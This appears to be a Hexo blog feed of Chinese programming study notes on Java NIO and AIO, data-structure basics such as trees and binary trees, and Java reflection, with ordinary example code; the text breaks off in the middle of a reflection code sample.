<p><img data-src="https://i.loli.net/2021/01/23/z69OZodIbYa2DKh.png" alt="1566446643154"></p>
<h1 id="第五章-NIO"><a href="#第五章-NIO" class="headerlink" title="第五章 NIO"></a>第五章 NIO</h1><h2 id="5-1-NIO概述"><a href="#5-1-NIO概述" class="headerlink" title="5.1 NIO概述"></a>5.1 NIO概述</h2><h3 id="5-1-1-NIO引入"><a href="#5-1-1-NIO引入" class="headerlink" title="5.1.1  NIO引入"></a>5.1.1  NIO引入</h3><p>在我们学习Java的NIO流之前，我们都要了解几个关键词</p>
<ul>
<li>同步与异步（synchronous/asynchronous）：<strong>同步</strong>是一种可靠的有序运行机制，当我们进行同步操作时，后续的任务是等待当前调用返回，才会进行下一步；而<strong>异步</strong>则相反，其他任务不需要等待当前调用返回，通常依靠事件、回调等机制来实现任务间次序关系</li>
<li>阻塞与非阻塞：在进行<strong>阻塞</strong>操作时，当前线程会处于阻塞状态，无法从事其他任务，只有当条件就绪才能继续，比如ServerSocket新连接建立完毕，或者数据读取、写入操作完成；而<strong>非阻塞</strong>则是不管IO操作是否结束，直接返回，相应操作在后台继续处理</li>
</ul>
<p>在Java1.4之前的I/O系统中，提供的都是面向流的I/O系统，系统一次一个字节地处理数据，一个输入流产生一个字节的数据，一个输出流消费一个字节的数据，面向流的I/O速度非常慢，<strong>而在Java 1.4中推出了NIO，这是一个面向块的I/O系统，系统以块的方式处理处理，每一个操作在一步中产生或者消费一个数据库，按块处理要比按字节处理数据快的多。</strong></p>
<p>在 Java 7 中，NIO 有了进一步的改进，也就是 NIO 2，引入了异步非阻塞 IO 方式，也有很多人叫它 AIO（Asynchronous IO）。异步 IO 操作基于事件和回调机制，可以简单理解为，应用操作直接返回，而不会阻塞在那里，当后台处理完成，操作系统会通知相应线程进行后续工作。</p>
<h2 id="5-2-NIO-同步、非阻塞"><a href="#5-2-NIO-同步、非阻塞" class="headerlink" title="5.2 NIO(同步、非阻塞)"></a>5.2 NIO(同步、非阻塞)</h2><p><strong>NIO之所以是同步，是因为它的accept/read/write方法的内核I/O操作都会阻塞当前线程</strong></p>
<p>首先，我们要先了解一下NIO的三个主要组成部分：Channel（通道）、Buffer（缓冲区）、Selector（选择器）</p>
<h3 id="5-2-1-Channel（通道）"><a href="#5-2-1-Channel（通道）" class="headerlink" title="5.2.1 Channel（通道）"></a><strong>5.2.1 Channel（通道）</strong></h3><p>Channel（通道）：Channel是一个对象，可以通过它读取和写入数据。可以把它看做是IO中的流，不同的是：</p>
<ul>
<li>Channel是双向的，既可以读又可以写，而流是单向的</li>
<li>Channel可以进行异步的读写</li>
<li>对Channel的读写必须通过buffer对象</li>
</ul>
<p>正如上面提到的，所有数据都通过Buffer对象处理，所以，您永远不会将字节直接写入到Channel中，相反，您是将数据写入到Buffer中；同样，您也不会从Channel中读取字节，而是将数据从Channel读入Buffer，再从Buffer获取这个字节。</p>
<p>因为Channel是双向的，所以Channel可以比流更好地反映出底层操作系统的真实情况。特别是在Unix模型中，底层操作系统通常都是双向的。</p>
<p>在Java NIO中的Channel主要有如下几种类型：</p>
<ul>
<li>FileChannel：从文件读取数据的</li>
<li>DatagramChannel：读写UDP网络协议数据</li>
<li>SocketChannel：读写TCP网络协议数据</li>
<li>ServerSocketChannel：可以监听TCP连接</li>
</ul>
<h3 id="5-2-2-Buffer"><a href="#5-2-2-Buffer" class="headerlink" title="5.2.2 Buffer"></a>5.2.2 Buffer</h3><p>Buffer是一个对象，它包含一些要写入或者读到Stream对象的。应用程序不能直接对 Channel 进行读写操作，而必须通过 Buffer 来进行，即 Channel 是通过 Buffer 来读写数据的。</p>
<p>在NIO中，所有的数据都是用Buffer处理的，它是NIO读写数据的中转池。Buffer实质上是一个数组，通常是一个字节数据，但也可以是其他类型的数组。但一个缓冲区不仅仅是一个数组，重要的是它提供了对数据的结构化访问，而且还可以跟踪系统的读写进程。</p>
<p>使用 Buffer 读写数据一般遵循以下四个步骤：</p>
<p>1.写入数据到 Buffer；</p>
<p>2.调用 flip() 方法；</p>
<p>3.从 Buffer 中读取数据；</p>
<p>4.调用 clear() 方法或者 compact() 方法。</p>
<p>当向 Buffer 写入数据时，Buffer 会记录下写了多少数据。一旦要读取数据，需要通过 flip() 方法将 Buffer 从写模式切换到读模式。在读模式下，可以读取之前写入到 Buffer 的所有数据。</p>
<p>一旦读完了所有的数据，就需要清空缓冲区，让它可以再次被写入。有两种方式能清空缓冲区：调用 clear() 或 compact() 方法。clear() 方法会清空整个缓冲区。compact() 方法只会清除已经读过的数据。任何未读的数据都被移到缓冲区的起始处，新写入的数据将放到缓冲区未读数据的后面。</p>
<p>Buffer主要有如下几种：</p>
<ul>
<li>ByteBuffer</li>
<li>CharBuffer</li>
<li>DoubleBuffer</li>
<li>FloatBuffer</li>
<li>IntBuffer</li>
<li>LongBuffer</li>
<li>ShortBuffer</li>
</ul>
<p>我们将通过CopyFile这个实力让大家体会NIO的操作过程。CopyFile执行三个基本的操作：创建一个Buffer，然后从源文件读取数据到缓冲区，然后再将缓冲区写入目标文件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copyFileUseNIO</span><span class="params">(String src,String dst)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line"><span class="comment">//声明源文件和目标文件</span></span><br><span class="line">        FileInputStream fi=<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(src));</span><br><span class="line">        FileOutputStream fo=<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(dst));</span><br><span class="line">        <span class="comment">//获得传输通道channel</span></span><br><span class="line">        FileChannel inChannel=fi.getChannel();</span><br><span class="line">        FileChannel outChannel=fo.getChannel();</span><br><span class="line">        <span class="comment">//获得容器buffer</span></span><br><span class="line">        ByteBuffer buffer=ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="comment">//判断是否读完文件</span></span><br><span class="line">            <span class="keyword">int</span> eof =inChannel.read(buffer);</span><br><span class="line">            <span class="keyword">if</span>(eof==-<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//重设一下buffer的position=0，limit=position</span></span><br><span class="line">            buffer.flip();</span><br><span class="line">            <span class="comment">//开始写</span></span><br><span class="line">            outChannel.write(buffer);</span><br><span class="line">            <span class="comment">//写完要重置buffer，重设position=0,limit=capacity</span></span><br><span class="line">            buffer.clear();</span><br><span class="line">        &#125;</span><br><span class="line">        inChannel.close();</span><br><span class="line">        outChannel.close();</span><br><span class="line">        fi.close();</span><br><span class="line">        fo.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-2-3-Selector"><a href="#5-2-3-Selector" class="headerlink" title="5.2.3 Selector"></a>5.2.3 Selector</h3><p>首先需要了解一件事情就是线程上下文切换开销会在高并发时变得很明显，这是同步阻塞方式的低扩展性劣势。</p>
<p>Selector是一个对象，它可以注册到很多个Channel上，监听各个Channel上发生的事件，并且能够根据事件情况决定Channel读写。这样，通过一个线程管理多个Channel，就可以处理大量网络连接了。</p>
<p>有了Selector，我们就可以利用一个线程来处理所有的channels。线程之间的切换对操作系统来说代价是很高的，并且每个线程也会占用一定的系统资源。所以，对系统来说使用的线程越少越好。</p>
<h4 id="1-如何创建一个Selector"><a href="#1-如何创建一个Selector" class="headerlink" title="1.如何创建一个Selector"></a>1.如何创建一个Selector</h4><p>Selector 就是您注册对各种 I/O 事件兴趣的地方，而且当那些事件发生时，就是这个对象告诉您所发生的事件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Selector selector = Selector.open();</span><br></pre></td></tr></table></figure>

<h4 id="2-注册Channel到Selector"><a href="#2-注册Channel到Selector" class="headerlink" title="2.注册Channel到Selector"></a>2.注册Channel到Selector</h4><p>为了能让Channel和Selector配合使用，我们需要把Channel注册到Selector上。通过调用 channel.register（）方法来实现注册：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">channel.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line">SelectionKey key =channel.register(selector,SelectionKey.OP_READ);</span><br></pre></td></tr></table></figure>

<p>注意，注册的Channel 必须设置成异步模式 才可以,否则异步IO就无法工作，这就意味着我们不能把一个FileChannel注册到Selector，因为FileChannel没有异步模式，但是网络编程中的SocketChannel是可以的。</p>
<h4 id="3-关于SelectionKey"><a href="#3-关于SelectionKey" class="headerlink" title="3.关于SelectionKey"></a>3.关于SelectionKey</h4><p>请注意对register()的调用的返回值是一个SelectionKey。 SelectionKey 代表这个通道在此 Selector 上注册。当某个 Selector 通知您某个传入事件时，它是通过提供对应于该事件的 SelectionKey 来进行的。SelectionKey 还可以用于取消通道的注册。</p>
<p>SelectionKey中包含如下属性：</p>
<ul>
<li>The interest set</li>
<li>The ready set</li>
<li>The Channel</li>
<li>The Selector</li>
<li>An attached object (optional)</li>
</ul>
<h5 id="1-Interest-set"><a href="#1-Interest-set" class="headerlink" title="(1) Interest set"></a>(1) Interest set</h5><p>就像我们在前面讲到的把Channel注册到Selector来监听感兴趣的事件，interest set就是你要选择的感兴趣的事件的集合。你可以通过SelectionKey对象来读写interest set:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> interestSet = selectionKey.interestOps();</span><br><span class="line"><span class="keyword">boolean</span> isInterestedInAccept  = interestSet &amp; SelectionKey.OP_ACCEPT;</span><br><span class="line"><span class="keyword">boolean</span> isInterestedInConnect = interestSet &amp; SelectionKey.OP_CONNECT;</span><br><span class="line"><span class="keyword">boolean</span> isInterestedInRead    = interestSet &amp; SelectionKey.OP_READ;</span><br><span class="line"><span class="keyword">boolean</span> isInterestedInWrite   = interestSet &amp; SelectionKey.OP_WRITE;</span><br></pre></td></tr></table></figure>

<p>通过上面例子可以看到，我们可以通过用AND 和SelectionKey 中的常量做运算，从SelectionKey中找到我们感兴趣的事件。</p>
<h5 id="2-Ready-Set"><a href="#2-Ready-Set" class="headerlink" title="(2) Ready Set"></a>(2) Ready Set</h5><p>ready set 是通道已经准备就绪的操作的集合。在一次选Selection之后，你应该会首先访问这个ready set。Selection将在下一小节进行解释。可以这样访问ready集合：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> readySet = selectionKey.readyOps();</span><br></pre></td></tr></table></figure>

<p>可以用像检测interest集合那样的方法，来检测Channel中什么事件或操作已经就绪。但是，也可以使用以下四个方法，它们都会返回一个布尔类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">selectionKey.isAcceptable();</span><br><span class="line">selectionKey.isConnectable();</span><br><span class="line">selectionKey.isReadable();</span><br><span class="line">selectionKey.isWritable();</span><br></pre></td></tr></table></figure>

<h5 id="3-Channel-和-Selector"><a href="#3-Channel-和-Selector" class="headerlink" title="(3) Channel 和 Selector"></a>(3) Channel 和 Selector</h5><p>我们可以通过SelectionKey获得Selector和注册的Channel：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Channel  channel  = selectionKey.channel();</span><br><span class="line">Selector selector = selectionKey.selector();</span><br></pre></td></tr></table></figure>

<h5 id="4-Attach一个对象"><a href="#4-Attach一个对象" class="headerlink" title="(4) Attach一个对象"></a>(4) Attach一个对象</h5><p>可以将一个对象或者更多信息attach 到SelectionKey上，这样就能方便的识别某个给定的通道。例如，可以附加 与通道一起使用的Buffer，或是包含聚集数据的某个对象。使用方法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">selectionKey.attach(theObject);</span><br><span class="line">Object attachedObj = selectionKey.attachment();</span><br></pre></td></tr></table></figure>

<p>还可以在用register()方法向Selector注册Channel的时候附加对象。如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SelectionKey key = channel.register(selector, SelectionKey.OP_READ, theObject);</span><br></pre></td></tr></table></figure>

<h4 id="4-关于SelectedKeys"><a href="#4-关于SelectedKeys" class="headerlink" title="4.关于SelectedKeys()"></a>4.关于SelectedKeys()</h4><p><strong>生产系统中一般会额外进行就绪状态检查</strong></p>
<p>一旦调用了select()方法，它就会返回一个数值，表示一个或多个通道已经就绪，然后你就可以通过调用selector.selectedKeys()方法返回的SelectionKey集合来获得就绪的Channel。请看演示方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Set&lt;SelectionKey&gt; selectedKeys = selector.selectedKeys();</span><br></pre></td></tr></table></figure>

<p>当你通过Selector注册一个Channel时，channel.register()方法会返回一个SelectionKey对象，这个对象就代表了你注册的Channel。这些对象可以通过selectedKeys()方法获得。你可以通过迭代这些selected key来获得就绪的Channel，下面是演示代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Set&lt;SelectionKey&gt; selectedKeys = selector.selectedKeys();</span><br><span class="line">Iterator&lt;SelectionKey&gt; keyIterator = selectedKeys.iterator();</span><br><span class="line"><span class="keyword">while</span>(keyIterator.hasNext()) &#123; </span><br><span class="line">    SelectionKey key = keyIterator.next();</span><br><span class="line">    <span class="keyword">if</span>(key.isAcceptable()) &#123;</span><br><span class="line">        <span class="comment">// a connection was accepted by a ServerSocketChannel.</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.isConnectable()) &#123;</span><br><span class="line">        <span class="comment">// a connection was established with a remote server.</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.isReadable()) &#123;</span><br><span class="line">        <span class="comment">// a channel is ready for reading</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.isWritable()) &#123;</span><br><span class="line">        <span class="comment">// a channel is ready for writing</span></span><br><span class="line">    &#125;</span><br><span class="line">    keyIterator.remove();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个循环遍历selected key的集合中的每个key，并对每个key做测试来判断哪个Channel已经就绪。</p>
<p>请注意循环中最后的keyIterator.remove()方法。Selector对象并不会从自己的selected key集合中自动移除SelectionKey实例。我们需要在处理完一个Channel的时候自己去移除。当下一次Channel就绪的时候，Selector会再次把它添加到selected key集合中。</p>
<p>SelectionKey.channel()方法返回的Channel需要转换成你具体要处理的类型，比如是ServerSocketChannel或者SocketChannel等等。</p>
<blockquote>
<p>IO 都是同步阻塞模式，所以需要多线程以实现多任务处理。而 NIO 则是利用了单线程轮询事件的机制，通过高效地定位就绪的 Channel，来决定做什么，仅仅 select 阶段是阻塞的，可以有效避免大量客户端连接时，频繁线程切换带来的问题，应用的扩展能力有了非常大的提高</p>
</blockquote>
<h2 id="5-3-NIO2（-AIO）-异步、非阻塞"><a href="#5-3-NIO2（-AIO）-异步、非阻塞" class="headerlink" title="5.3 NIO2（==AIO）(异步、非阻塞)"></a>5.3 NIO2（==AIO）(异步、非阻塞)</h2><p>AIO是异步IO的缩写，虽然NIO在网络操作中，提供了非阻塞的方法，但是NIO的IO行为还是同步的。对于NIO来说，我们的业务线程是在IO操作准备好时，得到通知，接着就由这个线程自行进行IO操作，IO操作本身是同步的。</p>
<p>但是对AIO来说，则更加进了一步，它不是在IO准备好时再通知线程，而是在IO操作已经完成后，再给线程发出通知。因此AIO是不会阻塞的，此时我们的业务逻辑将变成一个回调函数，等待IO操作完成后，由系统自动触发。</p>
<p>与NIO不同，当进行读写操作时，只须直接调用API的read或write方法即可。这两种方法均为异步的，对于读操作而言，当有流可读取时，操作系统会将可读的流传入read方法的缓冲区，并通知应用程序；对于写操作而言，当操作系统将write方法传递的流写入完毕时，操作系统主动通知应用程序。 即可以理解为，read/write方法都是异步的，完成后会主动调用回调函数。 在JDK1.7中，这部分内容被称作NIO.2，主要在Java.nio.channels包下增加了下面四个异步通道：</p>
<ul>
<li>AsynchronousSocketChannel</li>
<li>AsynchronousServerSocketChannel</li>
<li>AsynchronousFileChannel</li>
<li>AsynchronousDatagramChannel</li>
</ul>
<p>在AIO socket编程中，服务端通道是AsynchronousServerSocketChannel，这个类提供了一个open()静态工厂，一个bind()方法用于绑定服务端IP地址（还有端口号），另外还提供了accept()用于接收用户连接请求。在客户端使用的通道是AsynchronousSocketChannel,这个通道处理提供open静态工厂方法外，还提供了read和write方法。</p>
<p>在AIO编程中，发出一个事件（accept read write等）之后要指定事件处理类（回调函数），AIO中的事件处理类是CompletionHandler&lt;V,A&gt;，这个接口定义了如下两个方法，分别在异步操作成功和失败时被回调。</p>
<p>void completed(V result, A attachment);</p>
<p>void failed(Throwable exc, A attachment);</p>
<p><strong>Netty框架</strong>：基于NIO 2.0封装好的通信框架，性能优异，稳定好，代码简单，大型技术大量公司经过实战使用以后，发现各方面都很好！！</p>
]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Code Language</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构</title>
    <url>/hexo-test/Information-Security-Study/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="少壮不努力，老大借吉言"><a href="#少壮不努力，老大借吉言" class="headerlink" title="少壮不努力，老大借吉言"></a>少壮不努力，老大借吉言</h1><h1 id="1、数据结构"><a href="#1、数据结构" class="headerlink" title="1、数据结构"></a>1、数据结构</h1><p>数据结构（Data Structure）是一门研究非数值运算的程序设计问题中计算机的操作对象，以及它们之间的关系和操作的学科。</p>
<p>1）数据结构中的时间复杂度：</p>
<p>一个算法的时间复杂度是该算法的时间开销，是求解问题规模 n 的函数。当 n 趋近于无穷大时，时间复杂度的数量级称为算法的渐进时间复杂度，记为：<br>$$<br>T(n) = O(f(n))<br>$$<br>它表示随问题规模的 n 的增长，算法执行时间的增长度和函数 f(n) 的增长率是相同的。</p>
<table>
<thead>
<tr>
<th>O(1)</th>
<th>O(n)</th>
<th>O(n²)</th>
<th>O(n㏒n)</th>
</tr>
</thead>
<tbody><tr>
<td>常量阶</td>
<td>线性阶</td>
<td>平方阶</td>
<td>线性对数阶</td>
</tr>
</tbody></table>
<p>对于一个算法的时间复杂度讨论一般是看它的最坏情况下的时间复杂度，也就是分析最坏情况下的算法执行的一个上限。</p>
<a id="more"></a>

<h1 id="2、树"><a href="#2、树" class="headerlink" title="2、树"></a>2、树</h1><h2 id="2-1-什么叫做树及其相关术语"><a href="#2-1-什么叫做树及其相关术语" class="headerlink" title="2.1 什么叫做树及其相关术语"></a>2.1 什么叫做树及其相关术语</h2><p>树（Tree）是 n （n &gt;= 0）个节点的有限集。从递归的角度来理解，在任意一棵树中：</p>
<ol>
<li>当 n = 0 时，树为空，或者说树不存在（这种情况无意义，一般不允许存在）</li>
<li>当 n = 1 时，该元素就成为树的根节点</li>
<li>当 n &gt; 1 时，必有一个元素为根节点，而其余节点可分为 m 个非空且互不相交的有限集 T1,T2,T3,….,Tm，其中每个集合本身又是一棵树，称之为根的子树（subtree）</li>
</ol>
<p>树的特点：</p>
<ul>
<li>一颗由 n 个节点组成的树，其边的数目必定是 n-1 。</li>
<li>在一棵树中，从任意的一个节点到另外的一个节点之间的路径有且仅有一条。</li>
</ul>
<h3 id="常用术语："><a href="#常用术语：" class="headerlink" title="常用术语："></a>常用术语：</h3><ul>
<li>深度：在一棵树中每个节点有自己的层次。如果某节点位于 L 层（根节点层数为 1 ），则其孩子节点位于 L+1 层，双亲节点（如果存在的话）位于 L - 1 层。树中节点的最大层次，称为树的深度或者高度。</li>
<li>度：一个节点的度表示了一个节点的子节点数目，如：一个节点的子节点有 5 个，那么这个节点度数为 5 </li>
<li>有序树：在一棵树中，如果同层的孩子节点左右互相换位置会使得其表达的意思发生变化，则该树为有序树。</li>
<li>无序树：同上，如果同层的孩子节点左右互换后，其表达的意思并无差别，则称为无序树。</li>
<li>森林：多颗不相交的树的集合就叫做森林</li>
</ul>
<h2 id="2-2-二叉树"><a href="#2-2-二叉树" class="headerlink" title="2.2 二叉树"></a>2.2 二叉树</h2><p>二叉树（Binary Tree）是另一种树形结构，其特点是每个节点至多只有两颗子树（即二叉树中不存在度大于 2 的节点），二叉树的子树有左右之分，其次序不能随意调换，因为二叉树是一种有序树。</p>
<h3 id="2-2-1-二叉树的性质"><a href="#2-2-1-二叉树的性质" class="headerlink" title="2.2.1 二叉树的性质"></a>2.2.1 二叉树的性质</h3><ul>
<li>在二叉树的第 i 层上至多有 2 <sup>i-1</sup> 个节点（i &gt;= 1）</li>
<li>深度为 k 的二叉树至多有 2<sup>k</sup>- 1 个节点</li>
<li>对于一棵完全二叉树 T ，如果其终端节点（叶子节点）数为 n<sub>0</sub> ,度为 2 的节点数为 n<sub>2</sub> ，则有 n<sub>0</sub> = n<sub>2</sub> + 1同样的，设 n<sub>1</sub> 为 T 中度为 1 的节点数。因为二叉树中的所有节点的度均小于或者等于 2 ，也就是说，对于任意的二叉树，其节点总数总是满足下式：n = n<sub>0</sub> + n<sub>1</sub> + n<sub>2</sub></li>
<li>设 B 为一棵二叉树的总边数。根据树的性质，对于一棵多叉树，边和节点的关系总满足：n = B + 1，B =  n<sub>1</sub> + 2n<sub>2</sub> </li>
<li>拥有 n 个节点的完全二叉树的深度为 log<sub>2</sub>n + 1</li>
<li>如果对一棵有 n 个节点的完全二叉树的节点按层序编号（从第一层到 log<sub>2</sub>n + 1 层，每层从左到右），则对任一节点 i （1 ≤ i ≤ n），有：<ul>
<li>如果 i = 1，则节点 i 是二叉树的根，没有双亲；如果 i &gt; 1 ，则其双亲节点编号为 i/2（向下取整）</li>
<li>如果 2i &gt; n，则节点 i 没有左孩子；否则其左孩子编号必为 2i</li>
<li>如果 2i + 1 &gt; n，则节点没有右孩子；否则其右孩子编号必为 2i + 1</li>
</ul>
</li>
</ul>
<h3 id="2-2-2-二叉树的遍历操作"><a href="#2-2-2-二叉树的遍历操作" class="headerlink" title="2.2.2 二叉树的遍历操作"></a>2.2.2 二叉树的遍历操作</h3><p>二叉树的遍历归根结底是一个递归的过程</p>
<ol>
<li>先序遍历<ol>
<li>访问根节点</li>
<li>先序遍历左子树</li>
<li>先序遍历右子树</li>
</ol>
</li>
<li>中序遍历<ol>
<li>中序遍历左子树</li>
<li>访问根节点</li>
<li>中序遍历右子树</li>
</ol>
</li>
<li>后序遍历<ol>
<li>后序遍历左子树</li>
<li>后序遍历右子树</li>
<li>访问根节点</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>反射和注解</title>
    <url>/hexo-test/Information-Security-Study/Code-Language/Java/%E5%8F%8D%E5%B0%84%E5%92%8C%E6%B3%A8%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="第一章-反射"><a href="#第一章-反射" class="headerlink" title="第一章 反射"></a>第一章 反射</h1><h2 id="1-1-反射的概述"><a href="#1-1-反射的概述" class="headerlink" title="1.1 反射的概述"></a>1.1 反射的概述</h2><h3 id="1-1-1-反射的引入"><a href="#1-1-1-反射的引入" class="headerlink" title="1.1.1  反射的引入"></a>1.1.1  反射的引入</h3><ul>
<li>问题：IDEA中的对象是怎么知道类有哪些属性，哪些方法的呢？</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">通过反射技术对象类进行了解剖得到了类的所有成员。</span><br></pre></td></tr></table></figure>

<h3 id="1-1-2-反射的概念"><a href="#1-1-2-反射的概念" class="headerlink" title="1.1.2  反射的概念"></a>1.1.2  反射的概念</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">Java反射就是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；并且能改变它的属性。而这也是Java被视为动态（或准动态，为啥要说是准动态，因为一般而言的动态语言定义是程序运行时，允许改变程序结构或变量类型，这种语言称为动态语言。从这个观点看，Perl，Python，Ruby是动态语言，C++，Java，C#不是动态语言。）语言的一个关键性质。</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="1-1-3-使用反射操作类成员的前提"><a href="#1-1-3-使用反射操作类成员的前提" class="headerlink" title="1.1.3 使用反射操作类成员的前提"></a>1.1.3 使用反射操作类成员的前提</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">要获得该类字节码文件对象，就是Class对象</span><br></pre></td></tr></table></figure>

<h3 id="1-1-4-反射在实际开发中的应用"><a href="#1-1-4-反射在实际开发中的应用" class="headerlink" title="1.1.4 反射在实际开发中的应用"></a>1.1.4 反射在实际开发中的应用</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">* 开发IDE(集成开发环境)，比如IDEA,Eclipse</span><br><span class="line">* 各种框架的设计和学习 比如Spring，Hibernate，Struct，Mybaits....</span><br></pre></td></tr></table></figure>

<h2 id="1-2-Class对象的获取方式"><a href="#1-2-Class对象的获取方式" class="headerlink" title="1.2 Class对象的获取方式"></a>1.2 Class对象的获取方式</h2><h3 id="1-2-1-三种获取方法"><a href="#1-2-1-三种获取方法" class="headerlink" title="1.2.1 三种获取方法"></a>1.2.1 三种获取方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1、通过对象调用 getClass() 方法来获取,通常应用在：比如你传过来一个 Object</span></span><br><span class="line"><span class="comment">//  类型的对象，而我不知道你具体是什么类，用这种方法</span></span><br><span class="line">　　Person p1 = <span class="keyword">new</span> Person();</span><br><span class="line">　　Class c1 = p1.getClass();</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、直接通过 类名.class 的方式得到,该方法最为安全可靠，程序性能更高</span></span><br><span class="line"><span class="comment">//  这说明任何一个类都有一个隐含的静态成员变量 class</span></span><br><span class="line">　　Class c2 = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3、通过 Class 对象的 forName("类的全名") 静态方法来获取，用的最多，</span></span><br><span class="line"><span class="comment">//   但可能抛出 ClassNotFoundException 异常</span></span><br><span class="line">　　Class c3 = Class.forName(<span class="string">"com.ys.reflex.Person"</span>);</span><br></pre></td></tr></table></figure>

<p>需要注意的是：<strong>一个类在 JVM 中只会有一个 Class 实例,</strong>即我们对上面获取的 c1,c2,c3进行 equals 比较，发现都是true</p>
<h3 id="1-2-2-Class类常用方法"><a href="#1-2-2-Class类常用方法" class="headerlink" title="1.2.2 Class类常用方法"></a>1.2.2 Class类常用方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">　　getName()：获得类的完整名字。</span><br><span class="line">　　getFields()：获得类的<span class="keyword">public</span>类型的属性。</span><br><span class="line">　　getDeclaredFields()：获得类的所有属性。包括<span class="keyword">private</span> 声明的和继承类</span><br><span class="line">　　getMethods()：获得类的<span class="keyword">public</span>类型的方法。</span><br><span class="line">　　getDeclaredMethods()：获得类的所有方法。包括<span class="keyword">private</span> 声明的和继承类</span><br><span class="line">　　getMethod(String name, Class[] parameterTypes)：获得类的特定方法，name参数指定方法的名字，parameterTypes 参数指定方法的参数类型。</span><br><span class="line">　　getConstructors()：获得类的<span class="keyword">public</span>类型的构造方法。</span><br><span class="line">　　getConstructor(Class[] parameterTypes)：获得类的特定构造方法，parameterTypes 参数指定构造方法的参数类型。</span><br><span class="line">　　newInstance()：通过类的不带参数的构造方法创建这个类的一个对象。</span><br></pre></td></tr></table></figure>

<ul>
<li>示例代码</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获得类完整的名字</span></span><br><span class="line">String className = c2.getName();</span><br><span class="line">System.out.println(className);<span class="comment">//输出com.ys.reflex.Person</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获得类的public类型的属性。</span></span><br><span class="line">Field[] fields = c2.getFields();</span><br><span class="line"><span class="keyword">for</span>(Field field : fields)&#123;</span><br><span class="line">   System.out.println(field.getName());<span class="comment">//age</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得类的所有属性。包括私有的</span></span><br><span class="line">Field [] allFields = c2.getDeclaredFields();</span><br><span class="line"><span class="keyword">for</span>(Field field : allFields)&#123;</span><br><span class="line">    System.out.println(field.getName());<span class="comment">//name    age</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得类的public类型的方法。这里包括 Object 类的一些方法</span></span><br><span class="line">Method [] methods = c2.getMethods();</span><br><span class="line"><span class="keyword">for</span>(Method method : methods)&#123;</span><br><span class="line">    System.out.println(method.getName());<span class="comment">//work waid equls toString hashCode等</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得类的所有方法。</span></span><br><span class="line">Method [] allMethods = c2.getDeclaredMethods();</span><br><span class="line"><span class="keyword">for</span>(Method method : allMethods)&#123;</span><br><span class="line">    System.out.println(method.getName());<span class="comment">//work say</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得指定的属性</span></span><br><span class="line">Field f1 = c2.getField(<span class="string">"age"</span>);</span><br><span class="line">System.out.println(f1);</span><br><span class="line"><span class="comment">//获得指定的私有属性</span></span><br><span class="line">Field f2 = c2.getDeclaredField(<span class="string">"name"</span>);</span><br><span class="line"><span class="comment">//启用和禁用访问安全检查的开关，值为 true，则表示反射的对象在使用时应该取消 java 语言的访问检查；反之不取消</span></span><br><span class="line">f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">System.out.println(f2);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建这个类的一个对象</span></span><br><span class="line">Object p2 =  c2.newInstance();</span><br><span class="line"><span class="comment">//将 p2 对象的  f2 